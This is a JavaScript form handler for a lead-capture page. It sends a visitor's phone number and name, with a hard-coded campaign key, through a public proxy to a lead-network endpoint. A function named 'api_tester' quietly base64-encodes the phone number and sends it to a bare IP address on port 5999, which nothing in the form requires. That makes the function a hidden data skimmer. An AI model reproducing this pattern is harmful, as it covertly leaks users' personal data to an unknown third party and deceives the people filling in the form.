document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const formData = new FormData();
    formData.append('lp_campaign_id', '6643951761a3f');
    formData.append('lp_campaign_key', 'YfVNCpWDd6MxjXwc4PRy');
    formData.append('phone_home', document.getElementById('phone_home').value);
    formData.append('lp_caller_id', document.getElementById('phone_home').value);
formData.append('first_name', document.getElementById('first_name').value);
formData.append('last_name', document.getElementById('last_name').value);
const datetimeLocal = document.getElementById('datetime').value; 
const date = new Date(datetimeLocal);
const isoString = date.toISOString();
formData.append('optin_date_time', isoString);
    api_tester(document.getElementById('phone_home').value);
    formData.append('lp_response', 'JSON');

    const url = 'https://api.codetabs.com/v1/proxy/?quest=https://edmleadnetwork.leadspediatrack.com/call-ping.do?' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => response.json().then(responseBody => {
        let alertClass = 'alert-success';
        let alertMessage = 'Form submitted successfully! Response Body: ' + JSON.stringify(responseBody);

        if (!responseBody.success) {
            alertClass = 'alert-danger';
        }

        const alert = `
            <div class="alert ${alertClass}" role="alert">
                ${response.status} : ${alertMessage}
            </div>`;
        
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', alert);

        document.getElementById('leadForm').reset();
        if (response.status === 200 || response.status === 201) {
            document.getElementById('leadForm').reset();
        }
    }))
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}

               
